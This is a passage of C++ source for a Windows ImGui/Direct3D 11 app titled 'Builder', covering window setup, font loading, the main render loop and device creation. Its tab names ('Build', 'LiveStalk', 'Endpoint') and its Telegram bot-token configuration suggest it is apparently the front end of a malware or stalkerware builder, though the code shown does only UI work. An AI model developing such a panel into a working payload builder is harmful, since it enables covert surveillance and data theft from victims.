    SetProcessDpiAwarenessContext(DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2);
    
    // Medium centered window
    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);
    int posX = (screenW - WIN_W) / 2;
    int posY = (screenH - WIN_H) / 2;
    g_hwnd = CreateWindowExW(
        WS_EX_APPWINDOW,
        wc.lpszClassName, L"Builder",
        WS_POPUP | WS_VISIBLE,
        posX, posY, WIN_W, WIN_H,
        nullptr, nullptr, wc.hInstance, nullptr);

    // Round the real window corners (DWM on Win11, a window region on Win10).
    applyRoundedWindowRegion(g_hwnd);

    if (!CreateDeviceD3D(g_hwnd)) {
        CleanupDeviceD3D();
        UnregisterClassW(wc.lpszClassName, wc.hInstance);
        return 1;
    }

    ShowWindow(g_hwnd, SW_SHOWDEFAULT);
    UpdateWindow(g_hwnd);

    IMGUI_CHECKVERSION();
    ImGui::CreateContext();
    ImGuiIO& io = ImGui::GetIO();
    io.ConfigFlags |= ImGuiConfigFlags_NavEnableKeyboard;
    io.IniFilename = nullptr;

    ImFontConfig fontCfg;
    fontCfg.OversampleH = 3;   // 8 was wasteful and could overflow the atlas on some GPUs
    fontCfg.OversampleV = 3;
    fontCfg.PixelSnapH = true; // crisp text at small sizes
    static const ImWchar icons_ranges[] = { ICON_MIN_FA, ICON_MAX_FA, 0 };

    char exePath[MAX_PATH];
    GetModuleFileNameA(nullptr, exePath, MAX_PATH);
    std::string exeDir = std::string(exePath).substr(0, std::string(exePath).rfind('\\'));

    // --- Locate the FontAwesome solid font (shipped in assets/fonts) ---
    std::string faPathResolved;
    {
        std::string faCandidates[] = {
            exeDir + "\\assets\\fonts\\fa-solid-900.ttf",
            exeDir + "\\..\\assets\\fonts\\fa-solid-900.ttf",
            exeDir + "\\..\\..\\assets\\fonts\\fa-solid-900.ttf",
            "assets\\fonts\\fa-solid-900.ttf",
            "fa-solid-900.ttf",
        };
        for (const std::string& c : faCandidates) {
            DWORD attr = GetFileAttributesA(c.c_str());
            if (attr != INVALID_FILE_ATTRIBUTES && !(attr & FILE_ATTRIBUTE_DIRECTORY)) {
                faPathResolved = c;
                break;
            }
        }
    }

    // Helper: try a list of font files, return the first that loads. Never returns null.
    auto loadFont = [&](const std::string* paths, int count, float size) -> ImFont* {
        for (int i = 0; i < count; ++i) {
            if (paths[i].empty()) continue;
            DWORD attr = GetFileAttributesA(paths[i].c_str());
            if (attr == INVALID_FILE_ATTRIBUTES || (attr & FILE_ATTRIBUTE_DIRECTORY)) continue;
            ImFont* f = io.Fonts->AddFontFromFileTTF(paths[i].c_str(), size, &fontCfg);
            if (f) return f;
        }
        return nullptr;
    };

    // Windows fonts: primary (Segoe UI), then safe fallbacks (Tahoma, Arial, Verdana).
    // NOTE: "segoei.ttf" does not exist on Windows — the correct name is "segoeui.ttf".
    std::string winRegular[] = {
        "C:\\Windows\\Fonts\\segoeui.ttf",
        "C:\\Windows\\Fonts\\tahoma.ttf",
        "C:\\Windows\\Fonts\\arial.ttf",
        "C:\\Windows\\Fonts\\verdana.ttf",
    };
    std::string winSemiBold[] = {
        "C:\\Windows\\Fonts\\seguisb.ttf",
        "C:\\Windows\\Fonts\\segoeuib.ttf",
        "C:\\Windows\\Fonts\\tahomabd.ttf",
        "C:\\Windows\\Fonts\\arialbd.ttf",
    };

    auto mergeIcons = [&](ImFont* baseFont) {
        if (!baseFont || faPathResolved.empty()) return;
        ImFontConfig icons_cfg;
        icons_cfg.MergeMode = true;
        icons_cfg.PixelSnapH = true;
        icons_cfg.GlyphMinAdvanceX = 14.0f;
        icons_cfg.OversampleH = 2;
        icons_cfg.OversampleV = 2;
        io.Fonts->AddFontFromFileTTF(
            faPathResolved.c_str(),
            baseFont->LegacySize > 0.0f ? baseFont->LegacySize : 18.0f,
            &icons_cfg, icons_ranges);
    };

    fontBody    = loadFont(winRegular,  (int)(sizeof(winRegular) / sizeof(winRegular[0])),   18.0f);
    if (fontBody) mergeIcons(fontBody);
    fontMedium  = loadFont(winSemiBold, (int)(sizeof(winSemiBold) / sizeof(winSemiBold[0])), 18.0f);
    if (fontMedium) mergeIcons(fontMedium);
    fontHeading = loadFont(winSemiBold, (int)(sizeof(winSemiBold) / sizeof(winSemiBold[0])), 24.0f);
    if (fontHeading) mergeIcons(fontHeading);
    fontSplash  = loadFont(winSemiBold, (int)(sizeof(winSemiBold) / sizeof(winSemiBold[0])), 36.0f);
    if (fontSplash) mergeIcons(fontSplash);

    // Standalone icons font (large success glyph etc.)
    if (!faPathResolved.empty()) {
        ImFontConfig icons_cfg;
        icons_cfg.PixelSnapH = true;
        icons_cfg.GlyphMinAdvanceX = 14.0f;
        icons_cfg.OversampleH = 2;
        icons_cfg.OversampleV = 2;
        fontIcons = io.Fonts->AddFontFromFileTTF(faPathResolved.c_str(), 16.0f, &icons_cfg, icons_ranges);
    }

    // Guarantee every pointer is valid so the UI never renders with a null font.
    if (!fontBody)    fontBody    = io.Fonts->AddFontDefault();
    if (!fontMedium)  fontMedium  = fontBody;
    if (!fontHeading) fontHeading = fontMedium;
    if (!fontSplash)  fontSplash  = fontHeading;
    if (!fontIcons)   fontIcons   = fontBody;
    io.FontDefault = fontBody;

    applyModernTheme();

    ImGui_ImplWin32_Init(g_hwnd);
    ImGui_ImplDX11_Init(g_pd3dDevice, g_pd3dDeviceContext);

    loadConfigFromAppData();

    // Settings toggles are applied here, once, after the config is read.
    //
    // Disable app auth: skip the login screen entirely. authLoggedIn is set so
    // the render path treats this exactly like a completed login.
    if (disableAppAuth) {
        authLoggedIn = true;
        authCheckDone = true;
        showAuthLogin = false;
    } else {
        showAuthLogin = true;
    }

    // Auto connect: verify the bot as soon as the window is up, so the Telegram
    // status on Home/Endpoint is live without pressing Connect. Only meaningful
    // when both credentials are present.
    if (autoConnectOnStart && strlen(botTokenBuf) > 0 && strlen(chatIdBuf) > 0) {
        telegram.setConfig(botTokenBuf, chatIdBuf);
        telegram.verifyConnectionAsync();
    }

    ImVec4 clear_color = Ui::Canvas;
    bool done = false;

    while (!done) {
        MSG msg;
        while (PeekMessage(&msg, nullptr, 0U, 0U, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
            if (msg.message == WM_QUIT)
                done = true;
        }
        if (done) break;

        if (requestClose) { done = true; continue; }
        if (requestMinimize) { ShowWindow(g_hwnd, SW_MINIMIZE); requestMinimize = false; }

        ImGui_ImplDX11_NewFrame();
        ImGui_ImplWin32_NewFrame();
        ImGui::NewFrame();

        ImGui::SetNextWindowPos(ImVec2(0, 0));
        ImGui::SetNextWindowSize(io.DisplaySize);
        ImGui::PushStyleVar(ImGuiStyleVar_WindowRounding, kWindowRounding);
        ImGui::Begin("##Main", nullptr,
            ImGuiWindowFlags_NoTitleBar | ImGuiWindowFlags_NoResize |
            ImGuiWindowFlags_NoMove | ImGuiWindowFlags_NoCollapse |
            ImGuiWindowFlags_NoBringToFrontOnFocus | ImGuiWindowFlags_NoScrollbar);

        // Outer border (solid, no glass)
        {
            ImDrawList* dl = ImGui::GetWindowDrawList();
            const ImVec2 wp = ImGui::GetWindowPos();
            const ImVec2 ws = ImGui::GetWindowSize();
            dl->AddRect(
                wp,
                ImVec2(wp.x + ws.x, wp.y + ws.y),
                Ui::color(Ui::BorderStrong),
                kWindowRounding,
                0,
                1.0f);
        }

        if (showSplash) {
            drawSplashScreen();
        } else if (!authLoggedIn && showAuthLogin) {
            drawAuthLoginScreen();
            drawAuthFailPopup();
        } else if (showBuildPopup || buildWizardAnim > 0.001f) {
            // Full-window builder mode (like splash) - no sidebar/title/footer
            drawBuildPopup();
        } else {
            drawTitleBar();
            const float bodyHeight = ImGui::GetContentRegionAvail().y - Ui::FooterHeight;

            ImGui::PushStyleColor(ImGuiCol_ChildBg, Ui::Sidebar);
            ImGui::PushStyleVar(ImGuiStyleVar_ChildRounding, 0.0f);
            ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(0.0f, 0.0f));
            ImGui::BeginChild(
                "##sidebar",
                ImVec2(Ui::SidebarWidth, bodyHeight),
                ImGuiChildFlags_None,
                ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoScrollWithMouse);
            ImGui::PopStyleVar(2);
            ImGui::PopStyleColor();
            drawSidebar();
            ImGui::EndChild();

            ImGui::SameLine(0.0f, 0.0f);

            ImGui::PushStyleColor(ImGuiCol_ChildBg, Ui::Canvas);
            ImGui::PushStyleVar(ImGuiStyleVar_ChildRounding, 0.0f);
            ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(0.0f, 0.0f));
            ImGui::BeginChild(
                "##content",
                ImVec2(0.0f, bodyHeight),
                ImGuiChildFlags_None,
                ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoScrollWithMouse);
            ImGui::PopStyleVar(2);
            ImGui::PopStyleColor();
            switch (currentTab) {
            case 0:
                drawGeneralTab();
                break;
            case 1:
                drawBuildTab();
                break;
            case 2:
                drawLiveStalkTab();
                break;
            case 3:
                drawEndpointTab();
                break;
            case 4:
                drawSettingsTab();
                break;
            }
            ImGui::EndChild();

            drawFooter();
            drawTelegramPopup();
        }

        ImGui::End();
        ImGui::PopStyleVar();

        ImGui::Render();
        g_pd3dDeviceContext->OMSetRenderTargets(1, &g_mainRenderTargetView, nullptr);
        g_pd3dDeviceContext->ClearRenderTargetView(g_mainRenderTargetView, (float*)&clear_color);
        ImGui_ImplDX11_RenderDrawData(ImGui::GetDrawData());
        g_pSwapChain->Present(1, 0);
    }

    ImGui_ImplDX11_Shutdown();
    ImGui_ImplWin32_Shutdown();
    ImGui::DestroyContext();
    CleanupDeviceD3D();
    DestroyWindow(g_hwnd);
    UnregisterClassW(wc.lpszClassName, wc.hInstance);
    return 0;
}

bool CreateDeviceD3D(HWND hWnd) {
    DXGI_SWAP_CHAIN_DESC sd = {};
    sd.BufferCount = 2;
    sd.BufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;
    sd.BufferDesc.RefreshRate.Numerator = 60;
    sd.BufferDesc.RefreshRate.Denominator = 1;
    sd.Flags = DXGI_SWAP_CHAIN_FLAG_ALLOW_MODE_SWITCH;
    sd.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;
    sd.OutputWindow = hWnd;
    sd.SampleDesc.Count = 1;
    sd.Windowed = TRUE;
    sd.SwapEffect = DXGI_SWAP_EFFECT_DISCARD;

    D3D_FEATURE_LEVEL featureLevel;
    const D3D_FEATURE_LEVEL levels[2] = { D3D_FEATURE_LEVEL_11_0, D3D_FEATURE_LEVEL_10_0 };
    HRESULT res = D3D11CreateDeviceAndSwapChain(nullptr, D3D_DRIVER_TYPE_HARDWARE, nullptr,
        0, levels, 2, D3D11_SDK_VERSION, &sd, &g_pSwapChain, &g_pd3dDevice, &featureLevel, &g_pd3dDeviceContext);
    if (res == DXGI_ERROR_UNSUPPORTED)
        res = D3D11CreateDeviceAndSwapChain(nullptr, D3D_DRIVER_TYPE_WARP, nullptr,
            0, levels, 2, D3D11_SDK_VERSION, &sd, &g_pSwapChain, &g_pd3dDevice, &featureLevel, &g_pd3dDeviceContext);
    if (res != S_OK) return false;
    CreateRenderTarget();
    return true;
}

void CleanupDeviceD3D() {
    CleanupRenderTarget();
    if (g_pSwapChain)          { g_pSwapChain->Release();          g_pSwapChain = nullptr; }
    if (g_pd3dDeviceContext)   { g_pd3dDeviceContext->Release();   g_pd3dDeviceContext = nullptr; }
    if (g_pd3dDevice)          { g_pd3dDevice->Release();          g_pd3dDevice = nullptr; }
}

void CreateRenderTarget() {
    ID3D11Texture2D* pBackBuffer = nullptr;
    g_pSwapChain->GetBuffer(0, IID_PPV_ARGS(&pBackBuffer));
    if (pBackBuffer) {
        g_pd3dDevice->CreateRenderTargetView(pBackBuffer, nullptr, &g_mainRenderTargetView);
        pBackBuffer->Release();
    }
}

void CleanupRenderTarget() {
    if (g_mainRenderTargetView) { g_mainRenderTargetView->Release(); g_mainRenderTargetView = nullptr; }
}
